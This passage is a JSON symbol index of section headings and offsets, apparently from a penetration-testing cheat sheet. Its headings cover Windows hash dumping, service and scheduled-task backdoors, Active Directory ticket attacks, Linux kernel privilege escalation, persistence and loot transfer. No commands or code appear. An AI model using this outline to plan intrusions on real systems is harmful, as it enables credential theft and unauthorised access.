Registry","ident_utf16":{"start":{"line_number":4906,"utf16_col":4},"end":{"line_number":4906,"utf16_col":39}},"extent_utf16":{"start":{"line_number":4906,"utf16_col":0},"end":{"line_number":4947,"utf16_col":0}}},{"name":"4.4.3 Grabbing Hashes from Windows","kind":"section_3","ident_start":169483,"ident_end":169517,"extent_start":169479,"extent_end":176878,"fully_qualified_name":"4.4.3 Grabbing Hashes from Windows","ident_utf16":{"start":{"line_number":4947,"utf16_col":4},"end":{"line_number":4947,"utf16_col":38}},"extent_utf16":{"start":{"line_number":4947,"utf16_col":0},"end":{"line_number":5148,"utf16_col":0}}},{"name":"4.4.3.1 Dumping Hashes from Windows Registry Backups","kind":"section_4","ident_start":170499,"ident_end":170551,"extent_start":170494,"extent_end":170889,"fully_qualified_name":"4.4.3.1 Dumping Hashes from Windows Registry Backups","ident_utf16":{"start":{"line_number":4982,"utf16_col":5},"end":{"line_number":4982,"utf16_col":57}},"extent_utf16":{"start":{"line_number":4982,"utf16_col":0},"end":{"line_number":5001,"utf16_col":0}}},{"name":"4.4.3.2 Dumping Hashes from Windows Domain Controller","kind":"section_4","ident_start":170894,"ident_end":170947,"extent_start":170889,"extent_end":171146,"fully_qualified_name":"4.4.3.2 Dumping Hashes from Windows Domain Controller","ident_utf16":{"start":{"line_number":5001,"utf16_col":5},"end":{"line_number":5001,"utf16_col":58}},"extent_utf16":{"start":{"line_number":5001,"utf16_col":0},"end":{"line_number":5010,"utf16_col":0}}},{"name":"4.4.3.3 Grab NTLMv2 Hashes Using Responder","kind":"section_4","ident_start":171151,"ident_end":171193,"extent_start":171146,"extent_end":173993,"fully_qualified_name":"4.4.3.3 Grab NTLMv2 Hashes Using Responder","ident_utf16":{"start":{"line_number":5010,"utf16_col":5},"end":{"line_number":5010,"utf16_col":47}},"extent_utf16":{"start":{"line_number":5010,"utf16_col":0},"end":{"line_number":5057,"utf16_col":0}}},{"name":"4.4.3.4 Dump Hashes and Passwords Using Crackmapexec","kind":"section_4","ident_start":173998,"ident_end":174050,"extent_start":173993,"extent_end":174395,"fully_qualified_name":"4.4.3.4 Dump Hashes and Passwords Using Crackmapexec","ident_utf16":{"start":{"line_number":5057,"utf16_col":5},"end":{"line_number":5057,"utf16_col":57}},"extent_utf16":{"start":{"line_number":5057,"utf16_col":0},"end":{"line_number":5073,"utf16_col":0}}},{"name":"4.4.3.5 Dump Hashes and Passwords Using mimikatz","kind":"section_4","ident_start":174400,"ident_end":174448,"extent_start":174395,"extent_end":176878,"fully_qualified_name":"4.4.3.5 Dump Hashes and Passwords Using mimikatz","ident_utf16":{"start":{"line_number":5073,"utf16_col":5},"end":{"line_number":5073,"utf16_col":53}},"extent_utf16":{"start":{"line_number":5073,"utf16_col":0},"end":{"line_number":5148,"utf16_col":0}}},{"name":"4.5 Miscellaneous Windows Commands","kind":"section_2","ident_start":176881,"ident_end":176915,"extent_start":176878,"extent_end":179746,"fully_qualified_name":"4.5 Miscellaneous Windows Commands","ident_utf16":{"start":{"line_number":5148,"utf16_col":3},"end":{"line_number":5148,"utf16_col":37}},"extent_utf16":{"start":{"line_number":5148,"utf16_col":0},"end":{"line_number":5229,"utf16_col":0}}},{"name":"4.6 Windows Persistence","kind":"section_2","ident_start":179749,"ident_end":179772,"extent_start":179746,"extent_end":183100,"fully_qualified_name":"4.6 Windows Persistence","ident_utf16":{"start":{"line_number":5229,"utf16_col":3},"end":{"line_number":5229,"utf16_col":26}},"extent_utf16":{"start":{"line_number":5229,"utf16_col":0},"end":{"line_number":5332,"utf16_col":0}}},{"name":"4.6.1 Add RDP User","kind":"section_3","ident_start":179778,"ident_end":179796,"extent_start":179774,"extent_end":180466,"fully_qualified_name":"4.6.1 Add RDP User","ident_utf16":{"start":{"line_number":5231,"utf16_col":4},"end":{"line_number":5231,"utf16_col":22}},"extent_utf16":{"start":{"line_number":5231,"utf16_col":0},"end":{"line_number":5253,"utf16_col":0}}},{"name":"4.6.2 Remote SYSTEM Backdoor","kind":"section_3","ident_start":180470,"ident_end":180498,"extent_start":180466,"extent_end":182719,"fully_qualified_name":"4.6.2 Remote SYSTEM Backdoor","ident_utf16":{"start":{"line_number":5253,"utf16_col":4},"end":{"line_number":5253,"utf16_col":32}},"extent_utf16":{"start":{"line_number":5253,"utf16_col":0},"end":{"line_number":5320,"utf16_col":0}}},{"name":"4.6.2.1 Backdoor Windows Services","kind":"section_4","ident_start":180580,"ident_end":180613,"extent_start":180575,"extent_end":181160,"fully_qualified_name":"4.6.2.1 Backdoor Windows Services","ident_utf16":{"start":{"line_number":5257,"utf16_col":5},"end":{"line_number":5257,"utf16_col":38}},"extent_utf16":{"start":{"line_number":5257,"utf16_col":0},"end":{"line_number":5279,"utf16_col":0}}},{"name":"4.6.2.2 Backdoor Service with PSExec","kind":"section_4","ident_start":181165,"ident_end":181201,"extent_start":181160,"extent_end":182003,"fully_qualified_name":"4.6.2.2 Backdoor Service with PSExec","ident_utf16":{"start":{"line_number":5279,"utf16_col":5},"end":{"line_number":5279,"utf16_col":41}},"extent_utf16":{"start":{"line_number":5279,"utf16_col":0},"end":{"line_number":5298,"utf16_col":0}}},{"name":"4.6.2.3 Backdoor Scheduled Tasks","kind":"section_4","ident_start":182008,"ident_end":182040,"extent_start":182003,"extent_end":182719,"fully_qualified_name":"4.6.2.3 Backdoor Scheduled Tasks","ident_utf16":{"start":{"line_number":5298,"utf16_col":5},"end":{"line_number":5298,"utf16_col":37}},"extent_utf16":{"start":{"line_number":5298,"utf16_col":0},"end":{"line_number":5320,"utf16_col":0}}},{"name":"4.6.3 Backdoor via WMIC","kind":"section_3","ident_start":182723,"ident_end":182746,"extent_start":182719,"extent_end":183100,"fully_qualified_name":"4.6.3 Backdoor via WMIC","ident_utf16":{"start":{"line_number":5320,"utf16_col":4},"end":{"line_number":5320,"utf16_col":27}},"extent_utf16":{"start":{"line_number":5320,"utf16_col":0},"end":{"line_number":5332,"utf16_col":0}}},{"name":"4.7 Windows Files of Interest","kind":"section_2","ident_start":183103,"ident_end":183132,"extent_start":183100,"extent_end":183801,"fully_qualified_name":"4.7 Windows Files of Interest","ident_utf16":{"start":{"line_number":5332,"utf16_col":3},"end":{"line_number":5332,"utf16_col":32}},"extent_utf16":{"start":{"line_number":5332,"utf16_col":0},"end":{"line_number":5355,"utf16_col":0}}},{"name":"5 Active Directory","kind":"section_1","ident_start":183803,"ident_end":183821,"extent_start":183801,"extent_end":238870,"fully_qualified_name":"5 Active Directory","ident_utf16":{"start":{"line_number":5355,"utf16_col":2},"end":{"line_number":5355,"utf16_col":20}},"extent_utf16":{"start":{"line_number":5355,"utf16_col":0},"end":{"line_number":6505,"utf16_col":0}}},{"name":"5.1 Active Directory Enumeration","kind":"section_2","ident_start":186760,"ident_end":186792,"extent_start":186757,"extent_end":202250,"fully_qualified_name":"5.1 Active Directory Enumeration","ident_utf16":{"start":{"line_number":5385,"utf16_col":3},"end":{"line_number":5385,"utf16_col":35}},"extent_utf16":{"start":{"line_number":5385,"utf16_col":0},"end":{"line_number":5782,"utf16_col":0}}},{"name":"5.1.1 Quick Active Directory Enumeration Script","kind":"section_3","ident_start":191951,"ident_end":191998,"extent_start":191947,"extent_end":193840,"fully_qualified_name":"5.1.1 Quick Active Directory Enumeration Script","ident_utf16":{"start":{"line_number":5542,"utf16_col":4},"end":{"line_number":5542,"utf16_col":51}},"extent_utf16":{"start":{"line_number":5542,"utf16_col":0},"end":{"line_number":5588,"utf16_col":0}}},{"name":"5.1.2 Domain Enumeration with PowerView","kind":"section_3","ident_start":193844,"ident_end":193883,"extent_start":193840,"extent_end":198323,"fully_qualified_name":"5.1.2 Domain Enumeration with PowerView","ident_utf16":{"start":{"line_number":5588,"utf16_col":4},"end":{"line_number":5588,"utf16_col":43}},"extent_utf16":{"start":{"line_number":5588,"utf16_col":0},"end":{"line_number":5698,"utf16_col":0}}},{"name":"5.1.3 Domain Enumeration with BloodHound","kind":"section_3","ident_start":198327,"ident_end":198367,"extent_start":198323,"extent_end":202250,"fully_qualified_name":"5.1.3 Domain Enumeration with BloodHound","ident_utf16":{"start":{"line_number":5698,"utf16_col":4},"end":{"line_number":5698,"utf16_col":44}},"extent_utf16":{"start":{"line_number":5698,"utf16_col":0},"end":{"line_number":5782,"utf16_col":0}}},{"name":"5.2 Attacking Active Directory Authentication","kind":"section_2","ident_start":202253,"ident_end":202298,"extent_start":202250,"extent_end":219738,"fully_qualified_name":"5.2 Attacking Active Directory Authentication","ident_utf16":{"start":{"line_number":5782,"utf16_col":3},"end":{"line_number":5782,"utf16_col":48}},"extent_utf16":{"start":{"line_number":5782,"utf16_col":0},"end":{"line_number":6090,"utf16_col":0}}},{"name":"5.2.1 Change Active Directory Credentials","kind":"section_3","ident_start":208592,"ident_end":208633,"extent_start":208588,"extent_end":209160,"fully_qualified_name":"5.2.1 Change Active Directory Credentials","ident_utf16":{"start":{"line_number":5844,"utf16_col":4},"end":{"line_number":5844,"utf16_col":45}},"extent_utf16":{"start":{"line_number":5844,"utf16_col":0},"end":{"line_number":5860,"utf16_col":0}}},{"name":"5.2.2 Password Spraying in Active Directory","kind":"section_3","ident_start":209164,"ident_end":209207,"extent_start":209160,"extent_end":211041,"fully_qualified_name":"5.2.2 Password Spraying in Active Directory","ident_utf16":{"start":{"line_number":5860,"utf16_col":4},"end":{"line_number":5860,"utf16_col":47}},"extent_utf16":{"start":{"line_number":5860,"utf16_col":0},"end":{"line_number":5912,"utf16_col":0}}},{"name":"5.2.3 AS-REP Roasting","kind":"section_3","ident_start":211045,"ident_end":211066,"extent_start":211041,"extent_end":214216,"fully_qualified_name":"5.2.3 AS-REP Roasting","ident_utf16":{"start":{"line_number":5912,"utf16_col":4},"end":{"line_number":5912,"utf16_col":25}},"extent_utf16":{"start":{"line_number":5912,"utf16_col":0},"end":{"line_number":5976,"utf16_col":0}}},{"name":"5.2.4 Kerberoasting","kind":"section_3","ident_start":214220,"ident_end":214239,"extent_start":214216,"extent_end":216691,"fully_qualified_name":"5.2.4 Kerberoasting","ident_utf16":{"start":{"line_number":5976,"utf16_col":4},"end":{"line_number":5976,"utf16_col":23}},"extent_utf16":{"start":{"line_number":5976,"utf16_col":0},"end":{"line_number":6023,"utf16_col":0}}},{"name":"5.2.5 Silver Ticket","kind":"section_3","ident_start":216695,"ident_end":216714,"extent_start":216691,"extent_end":219738,"fully_qualified_name":"5.2.5 Silver Ticket","ident_utf16":{"start":{"line_number":6023,"utf16_col":4},"end":{"line_number":6023,"utf16_col":23}},"extent_utf16":{"start":{"line_number":6023,"utf16_col":0},"end":{"line_number":6090,"utf16_col":0}}},{"name":"5.3 Lateral Movement in Active Directory","kind":"section_2","ident_start":219741,"ident_end":219781,"extent_start":219738,"extent_end":231835,"fully_qualified_name":"5.3 Lateral Movement in Active Directory","ident_utf16":{"start":{"line_number":6090,"utf16_col":3},"end":{"line_number":6090,"utf16_col":43}},"extent_utf16":{"start":{"line_number":6090,"utf16_col":0},"end":{"line_number":6346,"utf16_col":0}}},{"name":"5.3.1 PsExec on Active Directory","kind":"section_3","ident_start":220353,"ident_end":220385,"extent_start":220349,"extent_end":221474,"fully_qualified_name":"5.3.1 PsExec on Active Directory","ident_utf16":{"start":{"line_number":6096,"utf16_col":4},"end":{"line_number":6096,"utf16_col":36}},"extent_utf16":{"start":{"line_number":6096,"utf16_col":0},"end":{"line_number":6125,"utf16_col":0}}},{"name":"5.3.2 WMI and WinRM on Active Directory","kind":"section_3","ident_start":221478,"ident_end":221517,"extent_start":221474,"extent_end":225792,"fully_qualified_name":"5.3.2 WMI and WinRM on Active Directory","ident_utf16":{"start":{"line_number":6125,"utf16_col":4},"end":{"line_number":6125,"utf16_col":43}},"extent_utf16":{"start":{"line_number":6125,"utf16_col":0},"end":{"line_number":6206,"utf16_col":0}}},{"name":"5.3.3 Overpass-the-Hash","kind":"section_3","ident_start":225796,"ident_end":225819,"extent_start":225792,"extent_end":227822,"fully_qualified_name":"5.3.3 Overpass-the-Hash","ident_utf16":{"start":{"line_number":6206,"utf16_col":4},"end":{"line_number":6206,"utf16_col":27}},"extent_utf16":{"start":{"line_number":6206,"utf16_col":0},"end":{"line_number":6261,"utf16_col":0}}},{"name":"5.3.4 Pass-the-Ticket","kind":"section_3","ident_start":227826,"ident_end":227847,"extent_start":227822,"extent_end":229552,"fully_qualified_name":"5.3.4 Pass-the-Ticket","ident_utf16":{"start":{"line_number":6261,"utf16_col":4},"end":{"line_number":6261,"utf16_col":25}},"extent_utf16":{"start":{"line_number":6261,"utf16_col":0},"end":{"line_number":6317,"utf16_col":0}}},{"name":"5.3.5 DCOM","kind":"section_3","ident_start":229556,"ident_end":229566,"extent_start":229552,"extent_end":231835,"fully_qualified_name":"5.3.5 DCOM","ident_utf16":{"start":{"line_number":6317,"utf16_col":4},"end":{"line_number":6317,"utf16_col":14}},"extent_utf16":{"start":{"line_number":6317,"utf16_col":0},"end":{"line_number":6346,"utf16_col":0}}},{"name":"5.4 Active Directory Persistence","kind":"section_2","ident_start":231838,"ident_end":231870,"extent_start":231835,"extent_end":238870,"fully_qualified_name":"5.4 Active Directory Persistence","ident_utf16":{"start":{"line_number":6346,"utf16_col":3},"end":{"line_number":6346,"utf16_col":35}},"extent_utf16":{"start":{"line_number":6346,"utf16_col":0},"end":{"line_number":6505,"utf16_col":0}}},{"name":"5.4.1 Domain Controller Synchronization (DCSync)","kind":"section_3","ident_start":231876,"ident_end":231924,"extent_start":231872,"extent_end":233549,"fully_qualified_name":"5.4.1 Domain Controller Synchronization (DCSync)","ident_utf16":{"start":{"line_number":6348,"utf16_col":4},"end":{"line_number":6348,"utf16_col":52}},"extent_utf16":{"start":{"line_number":6348,"utf16_col":0},"end":{"line_number":6380,"utf16_col":0}}},{"name":"5.4.2 Volume Shadow Copy","kind":"section_3","ident_start":233553,"ident_end":233577,"extent_start":233549,"extent_end":235834,"fully_qualified_name":"5.4.2 Volume Shadow Copy","ident_utf16":{"start":{"line_number":6380,"utf16_col":4},"end":{"line_number":6380,"utf16_col":28}},"extent_utf16":{"start":{"line_number":6380,"utf16_col":0},"end":{"line_number":6441,"utf16_col":0}}},{"name":"5.4.3 Golden Ticket","kind":"section_3","ident_start":235838,"ident_end":235857,"extent_start":235834,"extent_end":238870,"fully_qualified_name":"5.4.3 Golden Ticket","ident_utf16":{"start":{"line_number":6441,"utf16_col":4},"end":{"line_number":6441,"utf16_col":23}},"extent_utf16":{"start":{"line_number":6441,"utf16_col":0},"end":{"line_number":6505,"utf16_col":0}}},{"name":"6 Linux","kind":"section_1","ident_start":238872,"ident_end":238879,"extent_start":238870,"extent_end":258525,"fully_qualified_name":"6 Linux","ident_utf16":{"start":{"line_number":6505,"utf16_col":2},"end":{"line_number":6505,"utf16_col":9}},"extent_utf16":{"start":{"line_number":6505,"utf16_col":0},"end":{"line_number":7241,"utf16_col":0}}},{"name":"6.1 Basic Linux Post-Exploit Enumeration","kind":"section_2","ident_start":238884,"ident_end":238924,"extent_start":238881,"extent_end":246647,"fully_qualified_name":"6.1 Basic Linux Post-Exploit Enumeration","ident_utf16":{"start":{"line_number":6507,"utf16_col":3},"end":{"line_number":6507,"utf16_col":43}},"extent_utf16":{"start":{"line_number":6507,"utf16_col":0},"end":{"line_number":6807,"utf16_col":0}}},{"name":"6.1.1 Watching for Linux Process Changes","kind":"section_3","ident_start":246143,"ident_end":246183,"extent_start":246139,"extent_end":246647,"fully_qualified_name":"6.1.1 Watching for Linux Process Changes","ident_utf16":{"start":{"line_number":6785,"utf16_col":4},"end":{"line_number":6785,"utf16_col":44}},"extent_utf16":{"start":{"line_number":6785,"utf16_col":0},"end":{"line_number":6807,"utf16_col":0}}},{"name":"6.2 Linux Privilege Escalation","kind":"section_2","ident_start":246650,"ident_end":246680,"extent_start":246647,"extent_end":256657,"fully_qualified_name":"6.2 Linux Privilege Escalation","ident_utf16":{"start":{"line_number":6807,"utf16_col":3},"end":{"line_number":6807,"utf16_col":33}},"extent_utf16":{"start":{"line_number":6807,"utf16_col":0},"end":{"line_number":7170,"utf16_col":0}}},{"name":"6.2.1 Abusing `sudo`","kind":"section_3","ident_start":246976,"ident_end":246996,"extent_start":246972,"extent_end":247666,"fully_qualified_name":"6.2.1 Abusing `sudo`","ident_utf16":{"start":{"line_number":6814,"utf16_col":4},"end":{"line_number":6814,"utf16_col":24}},"extent_utf16":{"start":{"line_number":6814,"utf16_col":0},"end":{"line_number":6835,"utf16_col":0}}},{"name":"6.2.2 Adding root user to /etc/shadow or /etc/passwd","kind":"section_3","ident_start":247670,"ident_end":247722,"extent_start":247666,"extent_end":248497,"fully_qualified_name":"6.2.2 Adding root user to /etc/shadow or /etc/passwd","ident_utf16":{"start":{"line_number":6835,"utf16_col":4},"end":{"line_number":6835,"utf16_col":56}},"extent_utf16":{"start":{"line_number":6835,"utf16_col":0},"end":{"line_number":6858,"utf16_col":0}}},{"name":"6.2.3 Grant passwordless sudo access","kind":"section_3","ident_start":248501,"ident_end":248537,"extent_start":248497,"extent_end":248637,"fully_qualified_name":"6.2.3 Grant passwordless sudo access","ident_utf16":{"start":{"line_number":6858,"utf16_col":4},"end":{"line_number":6858,"utf16_col":40}},"extent_utf16":{"start":{"line_number":6858,"utf16_col":0},"end":{"line_number":6866,"utf16_col":0}}},{"name":"6.2.4 LD_PRELOAD and LD_LIBRARY_PATH","kind":"section_3","ident_start":248641,"ident_end":248677,"extent_start":248637,"extent_end":249979,"fully_qualified_name":"6.2.4 LD_PRELOAD and LD_LIBRARY_PATH","ident_utf16":{"start":{"line_number":6866,"utf16_col":4},"end":{"line_number":6866,"utf16_col":40}},"extent_utf16":{"start":{"line_number":6866,"utf16_col":0},"end":{"line_number":6928,"utf16_col":0}}},{"name":"6.2.5 Hijacking SUID binaries","kind":"section_3","ident_start":249983,"ident_end":250012,"extent_start":249979,"extent_end":251856,"fully_qualified_name":"6.2.5 Hijacking SUID binaries","ident_utf16":{"start":{"line_number":6928,"utf16_col":4},"end":{"line_number":6928,"utf16_col":33}},"extent_utf16":{"start":{"line_number":6928,"utf16_col":0},"end":{"line_number":7009,"utf16_col":0}}},{"name":"6.2.6 Using NFS for Privilege Escalation","kind":"section_3","ident_start":251860,"ident_end":251900,"extent_start":251856,"extent_end":252436,"fully_qualified_name":"6.2.6 Using NFS for Privilege Escalation","ident_utf16":{"start":{"line_number":7009,"utf16_col":4},"end":{"line_number":7009,"utf16_col":44}},"extent_utf16":{"start":{"line_number":7009,"utf16_col":0},"end":{"line_number":7030,"utf16_col":0}}},{"name":"6.2.7 Using Docker for Privesc","kind":"section_3","ident_start":252440,"ident_end":252470,"extent_start":252436,"extent_end":252851,"fully_qualified_name":"6.2.7 Using Docker for Privesc","ident_utf16":{"start":{"line_number":7030,"utf16_col":4},"end":{"line_number":7030,"utf16_col":34}},"extent_utf16":{"start":{"line_number":7030,"utf16_col":0},"end":{"line_number":7043,"utf16_col":0}}},{"name":"6.2.8 Linux Kernel Exploits","kind":"section_3","ident_start":252855,"ident_end":252882,"extent_start":252851,"extent_end":256657,"fully_qualified_name":"6.2.8 Linux Kernel Exploits","ident_utf16":{"start":{"line_number":7043,"utf16_col":4},"end":{"line_number":7043,"utf16_col":31}},"extent_utf16":{"start":{"line_number":7043,"utf16_col":0},"end":{"line_number":7170,"utf16_col":0}}},{"name":"6.2.8.1 Dirty Cow","kind":"section_4","ident_start":252995,"ident_end":253012,"extent_start":252990,"extent_end":253398,"fully_qualified_name":"6.2.8.1 Dirty Cow","ident_utf16":{"start":{"line_number":7047,"utf16_col":5},"end":{"line_number":7047,"utf16_col":22}},"extent_utf16":{"start":{"line_number":7047,"utf16_col":0},"end":{"line_number":7065,"utf16_col":0}}},{"name":"6.2.8.2 PwnKit","kind":"section_4","ident_start":253403,"ident_end":253417,"extent_start":253398,"extent_end":255191,"fully_qualified_name":"6.2.8.2 PwnKit","ident_utf16":{"start":{"line_number":7065,"utf16_col":5},"end":{"line_number":7065,"utf16_col":19}},"extent_utf16":{"start":{"line_number":7065,"utf16_col":0},"end":{"line_number":7117,"utf16_col":0}}},{"name":"6.2.8.3 Get-Rekt BPF Sign Extension LPE","kind":"section_4","ident_start":255196,"ident_end":255235,"extent_start":255191,"extent_end":255628,"fully_qualified_name":"6.2.8.3 Get-Rekt BPF Sign Extension LPE","ident_utf16":{"start":{"line_number":7117,"utf16_col":5},"end":{"line_number":7117,"utf16_col":44}},"extent_utf16":{"start":{"line_number":7117,"utf16_col":0},"end":{"line_number":7136,"utf16_col":0}}},{"name":"6.2.8.4 Dirty Pipe","kind":"section_4","ident_start":255633,"ident_end":255651,"extent_start":255628,"extent_end":256657,"fully_qualified_name":"6.2.8.4 Dirty Pipe","ident_utf16":{"start":{"line_number":7136,"utf16_col":5},"end":{"line_number":7136,"utf16_col":23}},"extent_utf16":{"start":{"line_number":7136,"utf16_col":0},"end":{"line_number":7170,"utf16_col":0}}},{"name":"6.3 Linux Persistence","kind":"section_2","ident_start":256660,"ident_end":256681,"extent_start":256657,"extent_end":257537,"fully_qualified_name":"6.3 Linux Persistence","ident_utf16":{"start":{"line_number":7170,"utf16_col":3},"end":{"line_number":7170,"utf16_col":24}},"extent_utf16":{"start":{"line_number":7170,"utf16_col":0},"end":{"line_number":7200,"utf16_col":0}}},{"name":"6.3.1 Add SSH key to authorized_keys","kind":"section_3","ident_start":256822,"ident_end":256858,"extent_start":256818,"extent_end":257242,"fully_qualified_name":"6.3.1 Add SSH key to authorized_keys","ident_utf16":{"start":{"line_number":7174,"utf16_col":4},"end":{"line_number":7174,"utf16_col":40}},"extent_utf16":{"start":{"line_number":7174,"utf16_col":0},"end":{"line_number":7190,"utf16_col":0}}},{"name":"6.3.2 Set SUID bit","kind":"section_3","ident_start":257246,"ident_end":257264,"extent_start":257242,"extent_end":257537,"fully_qualified_name":"6.3.2 Set SUID bit","ident_utf16":{"start":{"line_number":7190,"utf16_col":4},"end":{"line_number":7190,"utf16_col":22}},"extent_utf16":{"start":{"line_number":7190,"utf16_col":0},"end":{"line_number":7200,"utf16_col":0}}},{"name":"6.4 Miscellaneous Linux Commands","kind":"section_2","ident_start":257540,"ident_end":257572,"extent_start":257537,"extent_end":258169,"fully_qualified_name":"6.4 Miscellaneous Linux Commands","ident_utf16":{"start":{"line_number":7200,"utf16_col":3},"end":{"line_number":7200,"utf16_col":35}},"extent_utf16":{"start":{"line_number":7200,"utf16_col":0},"end":{"line_number":7222,"utf16_col":0}}},{"name":"6.4.1 Awk \u0026 Sed","kind":"section_3","ident_start":257755,"ident_end":257770,"extent_start":257751,"extent_end":258169,"fully_qualified_name":"6.4.1 Awk \u0026 Sed","ident_utf16":{"start":{"line_number":7209,"utf16_col":4},"end":{"line_number":7209,"utf16_col":19}},"extent_utf16":{"start":{"line_number":7209,"utf16_col":0},"end":{"line_number":7222,"utf16_col":0}}},{"name":"6.5 Linux Files of Interest","kind":"section_2","ident_start":258172,"ident_end":258199,"extent_start":258169,"extent_end":258525,"fully_qualified_name":"6.5 Linux Files of Interest","ident_utf16":{"start":{"line_number":7222,"utf16_col":3},"end":{"line_number":7222,"utf16_col":30}},"extent_utf16":{"start":{"line_number":7222,"utf16_col":0},"end":{"line_number":7241,"utf16_col":0}}},{"name":"7 Loot","kind":"section_1","ident_start":258527,"ident_end":258533,"extent_start":258525,"extent_end":270215,"fully_qualified_name":"7 Loot","ident_utf16":{"start":{"line_number":7241,"utf16_col":2},"end":{"line_number":7241,"utf16_col":8}},"extent_utf16":{"start":{"line_number":7241,"utf16_col":0},"end":{"line_number":7662,"utf16_col":0}}},{"name":"7.1 Sensitive Files","kind":"section_2","ident_start":258538,"ident_end":258557,"extent_start":258535,"extent_end":263691,"fully_qualified_name":"7.1 Sensitive Files","ident_utf16":{"start":{"line_number":7243,"utf16_col":3},"end":{"line_number":7243,"utf16_col":22}},"extent_utf16":{"start":{"line_number":7243,"utf16_col":0},"end":{"line_number":7410,"utf16_col":0}}},{"name":"7.1.1 Sensitive Files on Linux","kind":"section_3","ident_start":258710,"ident_end":258740,"extent_start":258706,"extent_end":260508,"fully_qualified_name":"7.1.1 Sensitive Files on Linux","ident_utf16":{"start":{"line_number":7249,"utf16_col":4},"end":{"line_number":7249,"utf16_col":34}},"extent_utf16":{"start":{"line_number":7249,"utf16_col":0},"end":{"line_number":7301,"utf16_col":0}}},{"name":"7.1.2 Sensitive Files on Windows","kind":"section_3","ident_start":260512,"ident_end":260544,"extent_start":260508,"extent_end":263152,"fully_qualified_name":"7.1.2 Sensitive Files on Windows","ident_utf16":{"start":{"line_number":7301,"utf16_col":4},"end":{"line_number":7301,"utf16_col":36}},"extent_utf16":{"start":{"line_number":7301,"utf16_col":0},"end":{"line_number":7383,"utf16_col":0}}},{"name":"7.1.3 Sensitive Files - Generic","kind":"section_3","ident_start":263156,"ident_end":263187,"extent_start":263152,"extent_end":263691,"fully_qualified_name":"7.1.3 Sensitive Files - Generic","ident_utf16":{"start":{"line_number":7383,"utf16_col":4},"end":{"line_number":7383,"utf16_col":35}},"extent_utf16":{"start":{"line_number":7383,"utf16_col":0},"end":{"line_number":7410,"utf16_col":0}}},{"name":"7.1.3.1 git repos","kind":"section_4","ident_start":263324,"ident_end":263341,"extent_start":263319,"extent_end":263691,"fully_qualified_name":"7.1.3.1 git repos","ident_utf16":{"start":{"line_number":7390,"utf16_col":5},"end":{"line_number":7390,"utf16_col":22}},"extent_utf16":{"start":{"line_number":7390,"utf16_col":0},"end":{"line_number":7410,"utf16_col":0}}},{"name":"7.2 File Transfers","kind":"section_2","ident_start":263694,"ident_end":263712,"extent_start":263691,"extent_end":270215,"fully_qualified_name":"7.2 File Transfers","ident_utf16":{"start":{"line_number":7410,"utf16_col":3},"end":{"line_number":7410,"utf16_col":21}},"extent_utf16":{"start":{"line_number":7410,"utf16_col":0},"end":{"line_number":7662,"utf16_col":0}}},{"name":"7.2.1 Netcat transfer","kind":"section_3","ident_start":263860,"ident_end":263881,"extent_start":263856,"extent_end":264020,"fully_qualified_name":"7.2.1 Netcat transfer","ident_utf16":{"start":{"line_number":7414,"utf16_col":4},"end":{"line_number":7414,"utf16_col":25}},"extent_utf16":{"start":{"line_number":7414,"utf16_col":0},"end":{"line_number":7423,"utf16_col":0}}},{"name":"7.2.2 Curl transfers","kind":"section_3","ident_start":264024,"ident_end":264044,"extent_start":264020,"extent_end":264214,"fully_qualified_name":"7.2.2 Curl transfers","ident_utf16":{"start":{"line_number":7423,"utf16_col":4},"end":{"line_number":7423,"utf16_col":24}},"extent_utf16":{"start":{"line_number":7423,"utf16_col":0},"end":{"line_number":7431,"utf16_col":0}}},{"name":"7.2.3 PHP File Uploads","kind":"section_3","ident_start":264218,"ident_end":264240,"extent_start":264214,"extent_end":265910,"fully_qualified_name":"7.2.3 PHP File Uploads","ident_utf16":{"start":{"line_number":7431,"utf16_col":4},"end":{"line_number":7431,"utf16_col":26}},"extent_utf16":{"start":{"line_number":7431,"utf16_col":0},"end":{"line_number":7495,"utf16_col":0}}},{"name":"7.2.4 PowerShell File Transfers","kind":"section_3","ident_start":265914,"ident_end":265945,"extent_start":265910,"extent_end":266386,"fully_qualified_name":"7.2.4 PowerShell File Transfers","ident_utf16":{"start":{"line_number":7495,"utf16_col":4},"end":{"line_number":7495,"utf16_col":35}},"extent_utf16":{"start":{"line_number":7495,"utf16_col":0},"end":{"line_number":7508,"utf16_col":0}}},{"name":"7.2.5 Mount NFS Share","kind":"section_3","ident_start":266390,"ident_end":266411,"extent_start":266386,"extent_end":266537,"fully_qualified_name":"7.2.5 Mount NFS Share","ident_utf16":{"start":{"line_number":7508,"utf16_col":4},"end":{"line_number":7508,"utf16_col":25}},"extent_utf16":{"start":{"line_number":7508,"utf16_col":0},"end":{"line_number":7515,"utf16_col":0}}},{"name":"7.2.6 SMB Share","kind":"section_3","ident_start":266541,"ident_end":266556,"extent_start":266537,"extent_end":267437,"fully_qualified_name":"7.2.6 SMB Share","ident_utf16":{"start":{"line_number":7515,"utf16_col":4},"end":{"line_number":7515,"utf16_col":19}},"extent_utf16":{"start":{"line_number":7515,"utf16_col":0},"end":{"line_number":7550,"utf16_col":0}}},{"name":"7.2.7 FTP Server on Kali","kind":"section_3","ident_start":267441,"ident_end":267465,"extent_start":267437,"extent_end":268630,"fully_qualified_name":"7.2.7 FTP Server on Kali","ident_utf16":{"start":{"line_number":7550,"utf16_col":4},"end":{"line_number":7550,"utf16_col":28}},"extent_utf16":{"start":{"line_number":7550,"utf16_col":0},"end":{"line_number":7607,"utf16_col":0}}},{"name":"7.2.8 WebDAV","kind":"section_3","ident_start":268634,"ident_end":268646,"extent_start":268630,"extent_end":269132,"fully_qualified_name":"7.2.8 WebDAV","ident_utf16":{"start":{"line_number":7607,"utf16_col":4},"end":{"line_number":7607,"utf16_col":16}},"extent_utf16":{"start":{"line_number":7607,"utf16_col":0},"end":{"line_number":7625,"utf16_col":0}}},{"name":"7.2.9 SSHFS","kind":"section_3","ident_start":269136,"ident_end":269147,"extent_start":269132,"extent_end":269536,"fully_qualified_name":"7.2.9 SSHFS","ident_utf16":{"start":{"line_number":7625,"utf16_col":4},"end":{"line_number":7625,"utf16_col":15}},"extent_utf16":{"start":{"line_number":7625,"utf16_col":0},"end":{"line_number":7645,"utf16_col":0}}},{"name":"7.2.10 Windows LOLBAS File Downloads","kind":"section_3","ident_start":269540,"ident_end":269576,"extent_start":269536,"extent_end":270215,"fully_qualified_name":"7.2.10 Windows LOLBAS File Downloads","ident_utf16":{"start":{"line_number":7645,"utf16_col":4},"end":{"line_number":7645,"utf16_col":40}},"extent_utf16":{"start":{"line_number":7645,"utf16_col":0},"end":{"line_number":7662,"utf16_col":0}}},{"name":"8 Pivoting and 